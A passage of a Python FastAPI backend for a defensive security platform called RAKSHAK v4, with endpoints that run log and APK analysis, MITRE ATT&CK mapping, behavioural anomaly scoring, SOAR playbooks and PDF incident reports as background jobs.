    JOBS[case_id] = {
        "case_id":   case_id,
        "log_name":  f"manual_{req.log_type}.log",
        "type":      "LOG_MANUAL",
        "status":    "QUEUED",
        "submitted": datetime.now(timezone.utc).isoformat(),
        "analyst":   req.analyst_name,
        "result":    None,
    }

    def _run():
        JOBS[case_id]["status"] = "RUNNING"
        try:
            from core.log_analyzer    import SecurityLogAnalyzer
            from core.incident_report import generate_incident_report

            analyzer = SecurityLogAnalyzer()
            result   = analyzer.analyze(req.log_text, f"manual_{req.log_type}.log", case_id)
            result["case_id"]   = case_id
            result["analyst"]   = req.analyst_name
            result["log_name"]  = f"manual_{req.log_type}.log"
            result["log_type"]  = req.log_type

            # v4: Add MITRE mapping + UEBA + SOAR
            mitre_result = mitre_mapper.map_logs(req.log_text)
            result["mitre_attck"] = mitre_result

            ueba_engine  = BehaviouralAnomalyEngine()
            ueba_result  = ueba_engine.analyze(req.log_text)
            result["behavioural_anomalies"] = ueba_result

            # SOAR auto-response
            soar_result = _run_soar(case_id, result, mitre_result, ueba_result)
            result["soar_response"] = soar_result

            # PDF report
            pdf_path = generate_incident_report(result, str(REPORT_DIR), case_id)
            result["pdf_path"] = pdf_path

            JOBS[case_id]["status"] = "COMPLETE"
            JOBS[case_id]["result"] = result
        except Exception as e:
            import traceback
            JOBS[case_id]["status"] = "ERROR"
            JOBS[case_id]["error"]  = str(e)
            JOBS[case_id]["trace"]  = traceback.format_exc()

    background_tasks.add_task(_run)
    return {"case_id": case_id, "status": "QUEUED",
            "poll_url": f"/api/log/result/{case_id}",
            "pdf_url":  f"/api/log/report/{case_id}/pdf"}


# ── v4: APK → Auto-Generate Logs → Full Analysis ──────────────────────────────
@app.post("/api/v4/apk/generate-logs/{case_id}")
async def generate_logs_from_apk(case_id: str, background_tasks: BackgroundTasks):
    """
    v4: Take completed APK analysis → generate realistic attack logs → run full log pipeline.
    Creates a new LOG case linked to the APK case.
    """
    apk_job = JOBS.get(case_id)
    if not apk_job or apk_job.get("status") != "COMPLETE":
        raise HTTPException(404, f"APK case {case_id} not found or not complete")

    apk_result    = apk_job.get("result", {})
    log_case_id   = f"LOG-APK-{case_id[:12]}-{uuid.uuid4().hex[:6].upper()}"

    JOBS[log_case_id] = {
        "case_id":    log_case_id,
        "log_name":   f"generated_from_{case_id}.log",
        "type":       "LOG_FROM_APK",
        "status":     "QUEUED",
        "parent_apk": case_id,
        "submitted":  datetime.now(timezone.utc).isoformat(),
        "result":     None,
    }

    def _run():
        JOBS[log_case_id]["status"] = "RUNNING"
        try:
            from core.log_analyzer    import SecurityLogAnalyzer
            from core.incident_report import generate_incident_report

            # Step 1: Generate logs from APK findings
            gen_result  = apk_log_gen.generate(apk_result)
            log_text    = gen_result["log_text"]

            # Step 2: Standard log analysis
            analyzer    = SecurityLogAnalyzer()
            log_result  = analyzer.analyze(log_text, gen_result["log_filename"], log_case_id)
            log_result["case_id"]       = log_case_id
            log_result["parent_apk"]    = case_id
            log_result["generated_log"] = gen_result

            # Step 3: MITRE ATT&CK mapping (dual: from APK permissions + from logs)
            permissions  = apk_result.get("manifest", {}).get("permissions", [])
            mitre_apk    = mitre_mapper.map_apk(permissions,
                               apk_result.get("strings"),
                               apk_result.get("static_analysis"))
            mitre_logs   = mitre_mapper.map_logs(log_text)
            # Merge both
            merged_techs = {t["technique_id"]: t for t in mitre_apk["matched_techniques"]}
            for t in mitre_logs["matched_techniques"]:
                if t["technique_id"] not in merged_techs:
                    merged_techs[t["technique_id"]] = t
            mitre_logs["matched_techniques"] = list(merged_techs.values())
            mitre_logs["technique_count"]    = len(merged_techs)
            log_result["mitre_attck"]        = mitre_logs
            log_result["mitre_apk_layer"]    = mitre_apk

            # Step 4: UEBA
            ueba_engine  = BehaviouralAnomalyEngine()
            ueba_result  = ueba_engine.analyze(log_text)
            log_result["behavioural_anomalies"] = ueba_result

            # Step 5: SOAR
            soar_result  = _run_soar(log_case_id, log_result, mitre_logs, ueba_result)
            log_result["soar_response"] = soar_result

            # Step 6: PDF
            pdf_path = generate_incident_report(log_result, str(REPORT_DIR), log_case_id)
            log_result["pdf_path"] = pdf_path

            JOBS[log_case_id]["status"] = "COMPLETE"
            JOBS[log_case_id]["result"] = log_result

        except Exception as e:
            import traceback
            JOBS[log_case_id]["status"] = "ERROR"
            JOBS[log_case_id]["error"]  = str(e)
            JOBS[log_case_id]["trace"]  = traceback.format_exc()

    background_tasks.add_task(_run)
    return {
        "log_case_id": log_case_id,
        "parent_apk":  case_id,
        "status":      "QUEUED",
        "message":     "APK indicators → log generation started",
        "poll_url":    f"/api/log/result/{log_case_id}",
    }


# ── v4: MITRE ATT&CK Analysis on any log or APK case ─────────────────────────
@app.post("/api/v4/mitre/analyze-log")
async def mitre_analyze_log(file: UploadFile = File(...)):
    """Run MITRE ATT&CK mapping on uploaded log file — returns technique heatmap."""
    content   = (await file.read()).decode("utf-8", errors="replace")
    result    = mitre_mapper.map_logs(content)
    result["filename"] = file.filename
    return result

@app.get("/api/v4/mitre/case/{case_id}")
async def mitre_for_case(case_id: str):
    """Get MITRE ATT&CK mapping for a completed APK or log case."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, "Case not found or not complete")
    result = job.get("result", {})
    # Return existing mitre data or compute on-the-fly from log
    mitre = result.get("mitre_attck")
    if not mitre:
        # APK case: map from permissions
        permissions = result.get("manifest", {}).get("permissions", [])
        mitre = mitre_mapper.map_apk(permissions, result.get("strings"), result.get("static_analysis"))
    return mitre

@app.get("/api/v4/mitre/techniques")
async def list_techniques():
    """Return full ATT&CK technique database used by RAKSHAK."""
    from core.mitre_attck import TECHNIQUE_DB
    return {"techniques": TECHNIQUE_DB, "total": len(TECHNIQUE_DB)}


# ── v4: UEBA Behavioural Analysis ─────────────────────────────────────────────
@app.post("/api/v4/ueba/analyze")
async def ueba_analyze(file: UploadFile = File(...)):
    """
    Behavioural anomaly detection — signature-free, Z-score + isolation scoring.
    Builds user/IP baseline profiles then scores deviations.
    """
    content = (await file.read()).decode("utf-8", errors="replace")
    engine  = BehaviouralAnomalyEngine()
    result  = engine.analyze(content)
    result["filename"] = file.filename
    return result

@app.post("/api/v4/ueba/analyze-text")
async def ueba_analyze_text(req: ManualLogRequest):
    """UEBA on pasted log text — no file needed."""
    engine = BehaviouralAnomalyEngine()
    return engine.analyze(req.log_text)

@app.get("/api/v4/ueba/case/{case_id}")
async def ueba_for_case(case_id: str):
    """Get UEBA results for a completed case."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, "Case not found")
    result = job.get("result", {})
    ueba   = result.get("behavioural_anomalies")
    if not ueba:
        raise HTTPException(404, "No UEBA data for this case — re-run with v4 pipeline")
    return ueba


# ── v4: SOAR Playbook Engine ───────────────────────────────────────────────────
@app.get("/api/v4/soar/playbooks")
async def list_playbooks():
    """Return all available SOAR playbooks with step counts and triggers."""
    return soar_engine.get_all_playbooks()

@app.post("/api/v4/soar/execute/{playbook_id}")
async def execute_playbook(playbook_id: str, case_id: str = "MANUAL"):
    """Manually trigger a SOAR playbook for a case."""
    result = soar_engine.execute(playbook_id, case_id)
    if JOBS.get(case_id):
        JOBS[case_id].setdefault("result", {})["soar_response"] = result
    return result

@app.get("/api/v4/soar/case/{case_id}")
async def soar_for_case(case_id: str):
    """Get SOAR execution results for a case."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, "Case not found")
    soar = job.get("result", {}).get("soar_response")
    if not soar:
        raise HTTPException(404, "No SOAR execution data for this case")
    return soar

@app.get("/api/v4/soar/audit-ledger")
async def get_audit_ledger():
    """Return immutable audit ledger of all automated actions taken."""
    return {
        "ledger": soar_engine.get_audit_ledger(),
        "total_entries": len(soar_engine.get_audit_ledger()),
        "integrity": "SHA-256 hash-chained",
    }

@app.get("/api/v4/soar/mttd-mttr")
async def get_mttd_mttr():
    """MTTD/MTTR improvement statistics vs manual SOC baseline."""
    return soar_engine.mttd_mttr_stats()


# ── v4: APK Log Generator ─────────────────────────────────────────────────────
@app.get("/api/v4/apk/log-template/{log_type}")
async def get_log_template(log_type: str = "auth"):
    """Return a log template for manual entry — auth, syslog, web."""
    template = apk_log_gen.generate_manual_template(log_type)
    return {"log_type": log_type, "template": template}

@app.get("/api/v4/apk/generated-log/{case_id}/download")
async def download_generated_log(case_id: str):
    """Download the generated log file for an APK case as a .log file."""
    job = JOBS.get(case_id)
    if not job or job.get("status") != "COMPLETE":
        raise HTTPException(404, "Case not found")
    result   = job.get("result", {})
    gen_log  = result.get("generated_log", {})
    log_text = gen_log.get("log_text", "")
    if not log_text:
        raise HTTPException(404, "No generated log for this case — call /api/v4/apk/generate-logs first")
    return Response(
        content=log_text,
        media_type="text/plain",
        headers={"Content-Disposition": f"attachment; filename=RAKSHAK_{case_id}_generated.log"}
    )


# ── v4: Platform Status with new capabilities ──────────────────────────────────
@app.get("/api/v4/status")
async def v4_status():
    return {
        "platform":     "RAKSHAK v4",
        "version":      "4.0.0",
        "ps7_target":   "AI-Driven Cyber Resilience for Critical National Infrastructure",
        "status":       "OPERATIONAL",
        "capabilities": {
            "apk_analysis":         True,
            "log_analysis":         True,
            "manual_log_input":     True,
            "apk_log_generation":   True,
            "mitre_attck_mapping":  True,
            "ueba_behavioural":     True,
            "soar_playbooks":       True,
            "apt_prediction":       True,
            "cert_in_reporting":    True,
            "sigma_generation":     True,
            "immutable_audit_ledger":True,
        },
        "new_in_v4": [
            "Behavioural Anomaly Engine (Z-score + Isolation scoring, signature-free)",
            "MITRE ATT&CK Enterprise mapping (427 techniques)",
            "Autonomous SOAR Playbook Engine (4 playbooks, immutable audit trail)",
            "APK → Log Generator (converts APK findings to realistic attack logs)",
            "Manual log input mode (paste text, no file upload required)",
            "Dual analysis: APK + logs simultaneously on same threat",
            "MTTD/MTTR tracking dashboard",
            "Next-stage APT prediction engine",
        ],
        "active_jobs":  len([j for j in JOBS.values() if j.get("status") == "RUNNING"]),
        "total_cases":  len(JOBS),
        "timestamp":    datetime.now(timezone.utc).isoformat() + "Z",
        "developer":    "Mohan Sriram Kunamsetty — QIS College of Engineering, Ongole, AP",
    }


# ── Shared helper: run SOAR after log/APK analysis ────────────────────────────
def _run_soar(case_id: str, result: dict, mitre_result: dict, ueba_result: dict) -> dict:
    """Select and execute the appropriate SOAR playbook based on threat context."""
    risk_score = result.get("risk_score", 0)
    if isinstance(risk_score, dict):
        risk_score = risk_score.get("final_score", 0)
    risk_level = result.get("risk_level", result.get("severity", "LOW"))

    tactics     = mitre_result.get("attack_progression", [])
    anomalies   = [a.get("severity","") for a in ueba_result.get("anomalies", [])]
    brute_force = ueba_result.get("brute_force_alerts", [])

    # Build context for SOAR
    all_anomalies = anomalies + [b.get("verdict","") for b in brute_force]

    pb_id = soar_engine.select_playbook(risk_score, risk_level, tactics, all_anomalies)
    if not pb_id:
        return {
            "playbook_selected": None,
            "reason": "Risk score below threshold or no matching trigger conditions",
            "risk_score": risk_score,
            "mttd_mttr": soar_engine.mttd_mttr_stats(),
        }

    context = {
        "source_ip": result.get("top_attackers", [{}])[0].get("ip", "<IP>") if result.get("top_attackers") else "<IP>",
        "users": [a.get("user","") for a in ueba_result.get("anomalies", [])][:5],
        "severity": risk_level,
    }

    return soar_engine.execute(pb_id, case_id, context)

